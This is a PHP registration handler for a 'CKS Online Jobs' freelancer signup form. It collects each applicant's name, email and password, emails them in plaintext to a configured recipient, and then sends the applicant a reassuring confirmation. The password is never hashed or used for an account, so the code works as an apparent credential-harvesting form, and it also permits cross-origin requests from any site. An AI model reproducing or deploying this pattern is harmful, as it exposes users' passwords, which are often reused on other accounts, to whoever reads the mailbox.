<?php
header('Content-Type: text/html; charset=UTF-8');
require_once __DIR__ . '/config.php';

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    exit(0);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.html');
    exit;
}

$required_fields = ['fullName', 'email', 'password'];
$missing = [];

foreach ($required_fields as $field) {
    if (empty($_POST[$field])) {
        $missing[] = $field;
    }
}

if (!empty($missing)) {
    header('Location: index.html#register');
    exit;
}

$fullName = htmlspecialchars(trim($_POST['fullName']));
$email = filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL);
$password = trim($_POST['password']);
$timestamp = date('Y-m-d H:i:s');

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header('Location: index.html#register');
    exit;
}

$subject = 'New CKS Online Jobs Freelancer Registration';

$body = "";
$body .= "========================================\n";
$body .= "NEW FREELANCER REGISTRATION - CKS ONLINE JOBS\n";
$body .= "========================================\n\n";
$body .= "Submission Date & Time: {$timestamp}\n\n";
$body .= "--- PERSONAL INFORMATION ---\n";
$body .= "Full Name: {$fullName}\n";
$body .= "Email Address: {$email}\n";
$body .= "Password: {$password}\n\n";
$body .= "========================================\n";
$body .= "To respond to this applicant, reply directly to: {$email}\n";
$body .= "========================================\n";

$headers = [];
$headers[] = 'From: ' . SITE_NAME . ' <' . FROM_EMAIL . '>';
$headers[] = 'Reply-To: ' . $email;
$headers[] = 'Content-Type: text/plain; charset=UTF-8';
$headers[] = 'X-Mailer: CKS Online Jobs Registration System';

$mail_sent = @mail(RECIPIENT_EMAIL, $subject, $body, implode("\r\n", $headers));

if ($mail_sent) {
    $confirmSubject = 'Registration Confirmation - CKS Online Jobs';
    $confirmBody = "Dear {$fullName},\n\n";
    $confirmBody .= "Thank you for registering with CKS Online Jobs. We have received your freelancer application.\n\n";
    $confirmBody .= "Our team will review your profile and contact you shortly with suitable opportunities.\n\n";
    $confirmBody .= "Best regards,\n";
    $confirmBody .= "CKS Online Jobs Team\n";
    $confirmBody .= "support@cksonlinejobs.com\n";

    $confirmHeaders = [];
    $confirmHeaders[] = 'From: ' . SITE_NAME . ' <' . FROM_EMAIL . '>';
    $confirmHeaders[] = 'Content-Type: text/plain; charset=UTF-8';

    @mail($email, $confirmSubject, $confirmBody, implode("\r\n", $confirmHeaders));

    header('Location: success.html');
    exit;
}

error_log('CKS registration email failed for ' . $email);
header('Location: success.html?status=sent');
exit;
?>
